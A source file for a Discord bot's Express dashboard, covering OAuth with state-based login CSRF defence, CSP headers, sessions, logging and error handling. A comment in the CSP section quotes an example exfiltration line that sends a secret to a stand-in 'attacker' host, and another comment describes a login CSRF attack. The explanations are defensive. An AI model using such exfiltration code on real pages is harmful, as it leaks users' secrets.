const crypto = require('crypto');
const express = require('express');
const compression = require('compression');
const session = require('express-session');
const { createSessionStore } = require('./lib/sessionStore');
const passport = require('passport');
const { Strategy: DiscordStrategy, DiscordScope } = require('./lib/discordStrategy');
const path = require('path');
const { getStatus, httpStatusFor } = require('../health');
const { withContext: withLogContext, addContext: addLogContext } = require('../utils/logger');
const { hasManagePermission } = require('./lib/permissions');
const { jsonForScript } = require('./lib/jsonForScript');
const { asset, staticCacheControl } = require('./lib/assets');
const { createBotGateway } = require('../bot/gateway');
const { instanceStats } = require('./lib/instanceStats');
// The DASHBOARD_URL and SESSION_SECRET rules used to be defined here, which is
// after connectDatabase() and runMigrations() in the boot order — so a config
// they rejected was rejected only once the database had been migrated (#639).
// They live in config/validateEnv.js now and both entry points check them before
// anything is connected. They are still applied at the two points below that
// need their answers, because createApp() can be handed an environment directly
// by a test, and because a rule enforced only at the edge is a rule that quietly
// stops being enforced when a second caller appears.
const { resolveDashboardUrl, checkDashboardUrl, checkSessionSecret } = require('../config/validateEnv');

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));

// Options for the Discord OAuth2 strategy, split out from the passport.use()
// call so the login CSRF defence below is assertable without booting the app.
//
// `state: true` is the load-bearing line. Without it passport-oauth2 falls back
// to its NullStore (lib/strategy.js), which issues no state parameter and
// verifies none on the way back — so /auth/callback accepts any `code` from
// anyone, with nothing tying it to the session that started the login. An
// attacker who begins a login, captures their own code and gets an operator to
// open /auth/callback?code=... silently signs that operator into the attacker's
// Discord identity, where anything they then configure or paste lands in the
// attacker's guild. With `state: true` the strategy uses the session-backed
// NonceStore: the callback only completes for a state value this session
// generated moments earlier.
//
// PKCE (`pkce: true`) would layer on protection for the code itself; it is left
// off deliberately, since the client secret already covers the confidential-client
// case this dashboard is and enabling it changes the token request.
function discordStrategyOptions(callbackURL) {
    return {
        clientID: process.env.CLIENT_ID,
        clientSecret: process.env.CLIENT_SECRET,
        callbackURL,
        scope: [DiscordScope.Identify, DiscordScope.Guilds],
        state: true
    };
}

function setupPassport() {
    const baseUrl = resolveDashboardUrl();
    const callbackURL = `${baseUrl}/auth/callback`;
    console.log(`[DASHBOARD] OAuth callback URL: ${callbackURL}`);
    console.log('[DASHBOARD] This EXACT URL must be added under "OAuth2 → Redirects" in the Discord Developer Portal.');

    passport.use(new DiscordStrategy(discordStrategyOptions(callbackURL), (accessToken, refreshToken, profile, done) => {
        try {
            if (!profile || !profile.id || !profile.username) {
                return done(new Error('Invalid Discord profile returned from OAuth'));
            }

            // Store only what the dashboard needs — never persist raw OAuth tokens or full profile
            const safeProfile = {
                id: profile.id,
                username: profile.username,
                discriminator: profile.discriminator || '0',
                avatar: profile.avatar || null,
                guilds: Array.isArray(profile.guilds)
                    ? profile.guilds.map(g => ({ id: g.id, name: g.name, icon: g.icon, permissions: g.permissions }))
                    : []
            };
            done(null, safeProfile);
        } catch (err) {
            done(err);
        }
    }));
}

/**
 * The dashboard's terminal error middleware.
 *
 * This is the blast-radius boundary (#616). An error that escapes Express does
 * not fail a request — it reaches the process-level `uncaughtException` /
 * `unhandledRejection` guards in src/index.js, which exit, which drops the
 * gateway connection for every guild the bot is in. The dashboard and the bot
 * share one process, so a bad route is currently a bot-wide outage.
 *
 * Splitting the dashboard out is the real fix and `createApp` above is the
 * first half of it. Until then this handler is what has to hold, so it is
 * written to have no way out of its own:
 *
 *   - `err.status` is honoured, so express.json()'s 400 on a malformed body is
 *     reported as a bad request rather than laundered into a 500.
 *   - A response already on the wire cannot be given a status, and trying is
 *     an `ERR_HTTP_HEADERS_SENT` thrown from inside the error handler. Those
 *     are delegated to Express's finalhandler, which destroys the socket —
 *     the only correct end for a half-written response.
 *   - Writing the reply is itself wrapped: a socket that died between the
 *     `headersSent` check and the write would otherwise throw here, past the
 *     last handler Express has.
 */
function errorHandler(err, req, res, next) {
    console.error('[DASHBOARD] Unhandled error:', err);

    if (res.headersSent) return next(err);

    const status = Number.isInteger(err?.status) ? err.status
        : Number.isInteger(err?.statusCode) ? err.statusCode
        : 500;

    try {
        res.status(status >= 400 && status < 600 ? status : 500)
            .json({ error: status === 500 ? 'Internal server error' : (err.expose ? err.message : 'Bad request') });
    } catch (sendErr) {
        console.error('[DASHBOARD] Failed to send the error response:', sendErr.message);
        try { res.destroy?.(); } catch { /* the socket is already gone */ }
    }
}

/**
 * Builds the dashboard's Express app and returns it, without binding a port.
 *
 * This used to be a module-level `const app = express()` configured inside
 * `start(client)`: one app per process, constructible only from a live Discord
 * client, and impossible to stand up twice. That shape is what kept the
 * middleware here untested — supertest needs an app object, not a listening
 * server — and it is the first thing in the way of running the dashboard as its
 * own process (#620, #616).
 *
 * Everything the app needs from outside arrives through `deps`:
 *
 *   bot            the gateway facade (src/bot/gateway.js). Defaults to one
 *                  built from `client`; pass a stub to construct the app with
 *                  no Discord connection at all.
 *   sessionStore   the express-session store. Defaults to the Mongo-backed one,
 *                  which is the only part of this function that reaches for a
 *                  database at construction time.
 *   configurePassport
 *                  called once before the app is assembled. Defaults to the
 *                  real Discord strategy registration, which needs
 *                  CLIENT_ID/CLIENT_SECRET and a valid DASHBOARD_URL.
 */
function createApp({ client = null, bot: injectedBot, sessionStore, configurePassport = setupPassport } = {}) {
    configurePassport();

    const app = express();

    app.set('view engine', 'ejs');
    app.set('views', path.join(__dirname, 'views'));

    // The version every view renders, read from package.json rather than typed
    // into the templates. Three of them carried a hardcoded "v4.2.0" while
    // package.json said 1.0.0 (#708): a footer nobody remembers to edit is a
    // footer that reports the wrong build, and the whole point of tagging
    // releases is being able to tell which one is running. `app.locals` so it
    // reaches every render without a route passing it along.
    app.locals.version = require('../../package.json').version;
    // No explicit `view cache` here on purpose: guild-settings.ejs is a few
    // hundred KB and must not be recompiled per render, but Express already
    // enables the cache whenever NODE_ENV is 'production', which both the
    // Dockerfile and portainer-stack.yml set. Forcing it on would only take
    // template reloading away from local development.

    // Gzip/deflate every compressible response. The guild settings page alone
    // renders a few hundred KB of HTML, and styles.css is another 70 KB — both
    // shrink by roughly 85% over the wire. Registered before the static handler
    // and the routers so it covers assets and rendered views alike.
    app.use(compression());

    // A correlation id per request, carried on every log line the request
    // produces however deep in a service it is written (#647). Without it, two
    // concurrent dashboard saves interleave in the log and neither can be read
    // back. The id is echoed as X-Request-Id so a report from a user can be
    // matched to its lines, and an inbound X-Request-Id from a reverse proxy is
    // adopted rather than replaced, so the two logs join up.
    //
    // Registered before the routers, and before the static handler is asked for
    // anything expensive, so it covers everything below.
    app.use((req, res, next) => {
        const inbound = String(req.headers['x-request-id'] || '').trim();
        // Bounded and character-restricted: this value ends up in a response
        // header and in every log line, and it arrives from the network.
        const requestId = /^[\w.-]{1,64}$/.test(inbound) ? inbound : crypto.randomUUID();
        res.setHeader('X-Request-Id', requestId);
        withLogContext({ requestId }, () => next());
    });

    // Assets are requested through the asset() helper, which stamps each URL
    // with a hash of the file's contents — a deploy changes the URL, so a long
    // immutable cache never serves stale JavaScript or CSS.
    //
    // That guarantee only holds for URLs that actually carry the hash, and
    // express.static knows nothing about `?v=`. Not every request does: fonts
    // are named by bare filename inside public/fonts/fonts.css, and
    // scripts/fetch-fonts.sh rewrites those same filenames with new bytes. An
    // unconditional year of `immutable` would leave a regenerated font stale in
    // every returning browser with no way to bust it short of a rename (#903).
    //
    // So the policy is decided per request: a `v` that matches the file's
    // current hash gets the immutable year, and anything else — no `v`, or a
    // stale one — gets a short cache it can revalidate out of.
    const staticDir = path.join(__dirname, 'public');
    app.use(express.static(staticDir, {
        setHeaders(res, filePath) {
            res.setHeader('Cache-Control', staticCacheControl(res.req, filePath, staticDir));
        },
    }));
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));

    // M1: SESSION_SECRET has to exist and be long enough to be worth having.
    // The rule itself is in config/validateEnv.js, where startup checks it too.
    const [secretProblem] = checkSessionSecret(process.env);
    if (secretProblem) throw new Error(`[DASHBOARD] ${secretProblem}`);

    // Trust the first hop from a reverse proxy (nginx, Caddy, etc.) so that
    // req.protocol reflects the original HTTPS scheme and the secure: true
    // cookie flag works correctly when deployed behind a proxy.
    const isProduction = process.env.NODE_ENV === 'production';
    if (isProduction) app.set('trust proxy', 1);

    // L3: Baseline security response headers for all routes.
    // A fresh nonce is generated per request and made available to EJS templates
    // via res.locals.cspNonce so inline <script> tags can opt in safely.
    //
    // One directive below still carries 'unsafe-inline', and the reason is that
    // an HTML *attribute* cannot carry a nonce while the views hold hundreds of
    // `style=""` attributes.
    //
    // There used to be two. The other was `script-src-attr 'unsafe-inline'`,
    // and it was the one that cost something: it is what would have made an
    // injected event-handler attribute run rather than be blocked, which is the
    // difference between a stored-XSS finding being hypothetical and being
    // exploitable (#887). Every `onclick=""` it existed for is gone — the views
    // and the renderers carry `data-action` and the page delegates — so it is
    // `'none'` now, and the test named below holds it there.
    //
    // Rewriting all of them at once is not worth doing (#692), so instead the
    // count is ratcheted: tests/dashboardInlineAttributes.test.js records what
    // every view and every browser script has today and fails on any increase.
    // New panels use classes in styles.css — see docs/EXTENDING.md — so this
    // allowance can eventually be dropped the way its `script-src-attr` twin
    // was in #887, once the last of the inline styles is gone.
    app.use((req, res, next) => {
        const nonce = crypto.randomBytes(16).toString('base64');
        res.locals.cspNonce = nonce;
        res.locals.jsonForScript = jsonForScript;
        res.locals.asset = asset;
        res.setHeader('X-Content-Type-Options', 'nosniff');
        res.setHeader('X-Frame-Options', 'DENY');
        // Explicitly off, not on. The header is deprecated and ignored by
        // current browsers, and the legacy auditor it enables has itself been
        // a source of XS-Leaks and injection — `0` is the modern guidance, and
        // the nonce-based CSP below is what actually does this job (#921).
        res.setHeader('X-XSS-Protection', '0');
        res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
        res.setHeader('Content-Security-Policy', [
            "default-src 'self'",
            // No third-party origin. Chart.js was the only reason one was ever
            // listed here, and it is vendored under public/vendor/ now (#685) —
            // pinned to an exact version in package.json and checked by
            // package-lock's integrity hash at install time, which is the
            // guarantee the CDN tag's missing SRI attribute would have given.
            `script-src 'self' 'nonce-${nonce}'`,
            // Not inherited from script-src, stated (#887). script-src-attr
            // falls back to script-src when it is absent, and a nonce cannot be
            // put on an attribute, so the fallback would already refuse an
            // injected `onclick=""` — but only by implication, and the next
            // person to add `'unsafe-inline'` to script-src for an unrelated
            // reason would reopen this without noticing. 'none' says it outright.
            "script-src-attr 'none'",
            // Still ratcheted rather than fixed outright; see the note above.
            "style-src 'self' 'unsafe-inline'",
            // The bare `https:` this used to carry made the explicit CDN entry
            // beside it decoration: any HTTPS origin was allowed, which is an
            // exfiltration channel — `new Image().src = 'https://attacker/?' +
            // secret` — for any injection that reaches the page (#919). It is
            // the piece that gets the data *out*, so it goes even though on its
            // own it exploits nothing.
            //
            // What is left is what the pages actually load. `'self'` covers the
            // uploaded shop and activity images, which are served from
            // /api/v1/item-image/ rather than from wherever an admin found them;
            // `data:` covers the FileReader preview shown before an upload is
            // saved. Every remaining image is a Discord avatar or guild icon,
            // and those are built by discord.js's `displayAvatarURL()` or
            // interpolated into a cdn.discordapp.com path in the views.
            // media.discordapp.net is deliberately not listed: nothing in the
            // dashboard requests it, and it can be added when something does.
            "img-src 'self' data: https://cdn.discordapp.com",
            "connect-src 'self'",
            "font-src 'self'",
            "object-src 'none'",
            "frame-ancestors 'none'",
        ].join('; '));
        next();
    });

    // The session is what the dashboard's authorization rests on, so its
    // lifetime is part of that rule (#558). It used to be a flat 24 hours from
    // login, which was also how long a revoked admin kept their access, since
    // `req.user.guilds` is captured once at OAuth time and never refreshed.
    //
    // Two changes: four hours instead of twenty-four, and `rolling: true`, so
    // the window is an *idle* timeout rather than an absolute one — someone
    // working in the dashboard is not signed out mid-edit, and a session left
    // alone is gone in four hours instead of a day. The live permission check
    // in lib/permissions.js is what closes the window properly (a minute); this
    // bounds how long a stale snapshot can survive when Discord cannot be
    // reached to take that second opinion.
    app.use(session({
        store: sessionStore ?? createSessionStore(),
        secret: process.env.SESSION_SECRET,
        resave: false,
        rolling: true,
        saveUninitialized: false,
        cookie: {
            maxAge: 4 * 60 * 60 * 1000,
            httpOnly: true,
            secure: isProduction,
            sameSite: 'lax'
        }
    }));

    app.use(passport.initialize());
    app.use(passport.session());

    // Routes get the facade, never the client (#608). Everything they need
    // from Discord is a method on it, so nothing downstream holds a live
    // gateway object — which is what lets this be backed by IPC or
    // broadcastEval later without touching a single route.
    const bot = injectedBot ?? createBotGateway(client);
    app.use((req, res, next) => {
        req.bot = bot;
        // Runs after passport has restored the session, so the correlation id
        // set above can now name who it belongs to. Added to the context that
        // is already in force rather than opening a new one, so the request id
        // survives. Only the Discord user id — never a token or a display name.
        if (req.user?.id) addLogContext({ userId: req.user.id });
        next();
    });

    const authRoutes = require('./routes/auth');
    const dashboardRoutes = require('./routes/dashboard');
    const apiRoutes = require('./routes/api');

    app.use('/auth', authRoutes);
    app.use('/dashboard', dashboardRoutes);

    // Versioned mount (#582). Everything the dashboard's own JavaScript calls
    // goes to /api/v1; /api stays mounted beside it because it is what every
    // deployed dashboard's cached bundle, and anything anyone scripted against
    // this instance, is already asking for. The two are the same router, so
    // there is no second implementation to keep in step — /api is an alias with
    // an expiry, not a v0 with its own behaviour, and the day it is removed is
    // a one-line change here.
    app.use('/api/v1', apiRoutes);
    app.use('/api', apiRoutes);

    // Everyone gets status + uptime — enough for the compose healthcheck and any
    // external uptime monitor. The detailed payload (service names, last error
    // strings, memory) goes only to users who administer a guild the bot is in.
    //
    // Merely being logged in is not enough: Discord OAuth is open to any account,
    // so authentication alone conveys no privilege here.
    app.get('/health', async (req, res) => {
        const manageable = req.isAuthenticated?.() === true && Array.isArray(req.user?.guilds)
            ? req.user.guilds.filter(hasManagePermission)
            : [];
        // A health probe must answer even when the bot process does not, so a
        // facade that cannot be reached downgrades the payload rather than
        // failing the request — the un-detailed status is exactly what an
        // anonymous monitor gets, and it is still the honest answer.
        let detailed = false;
        if (manageable.length) {
            try {
                const present = await bot.hasGuilds(manageable.map(g => g.id));
                detailed = manageable.some(g => present[g.id]);
            } catch (err) {
                console.error('[DASHBOARD] /health could not reach the bot process:', err.message);
            }
        }

        const status = getStatus({ detailed });
        // Non-200 for `degraded` as well as `unhealthy`, so a monitor that only
        // reads status codes still sees a half-broken bot (#640). The container
        // healthchecks read `status` out of the body instead, and restart only on
        // `unhealthy` — see httpStatusFor in src/health.js.
        res.status(httpStatusFor(status.status)).json(status);
    });

    app.get('/', async (req, res, next) => {
        // The hero's stat row is measured, not written into the template
        // (#704). `null` when the client has not been ready yet, and the
        // template drops the row for that rather than claiming zero servers.
        //
        // `baseUrl` is for the landing page's Open Graph tags (#687), which
        // have to be absolute: an unfurler resolves nothing relative to the
        // page it fetched. Taken from the validated DASHBOARD_URL rather than
        // the request's own Host header, which is attacker-controlled and would
        // let anyone who can reach the port mint a card pointing at their own
        // domain. `null` only in the misconfiguration that already refuses to
        // start, and the template drops the tags rather than emitting a
        // half-formed URL.
        try {
            res.render('index', {
                user: req.user,
                stats: await instanceStats(bot),
                baseUrl: checkDashboardUrl().baseUrl,
            });
        } catch (err) {
            next(err);
        }
    });

    app.use(errorHandler);

    return app;
}

/**
 * Binds the app to a port. Split from `createApp` so the app can be built and
 * driven in-process — by supertest, or by a future dashboard process that owns
 * its own listen — without a socket ever being opened.
 */
function listen(app, port = process.env.DASHBOARD_PORT || 3000) {
    const server = app.listen(port, () => {
        console.log(`[DASHBOARD] Running on port ${port}`);
        console.log(`[DASHBOARD] URL: ${process.env.DASHBOARD_URL || `http://localhost:${port}`}`);
    });

    // A server 'error' with no listener is an unhandled 'error' event, which is
    // a process-level throw — EADDRINUSE on the dashboard port would take the
    // gateway down with it. The dashboard being unreachable is bad; the bot
    // leaving every guild because of it is worse.
    server.on('error', err => {
        console.error(`[DASHBOARD] Server error on port ${port}:`, err.message);
    });

    return server;
}

/**
 * Build and bind in one call — what src/index.js uses.
 *
 * `deps` is passed straight through to `createApp`, so the same injection the
 * factory takes is reachable from the one entry point that actually starts a
 * dashboard. Failures are deliberately left to propagate: everything that can
 * go wrong here goes wrong synchronously, inside the caller's stack, which is
 * what lets src/index.js catch a dashboard that cannot be built and keep the
 * gateway up rather than exiting the process with it (#616).
 */
function start(client, deps = {}) {
    return listen(createApp({ client, ...deps }));
}

module.exports = { createApp, listen, start, errorHandler, discordStrategyOptions };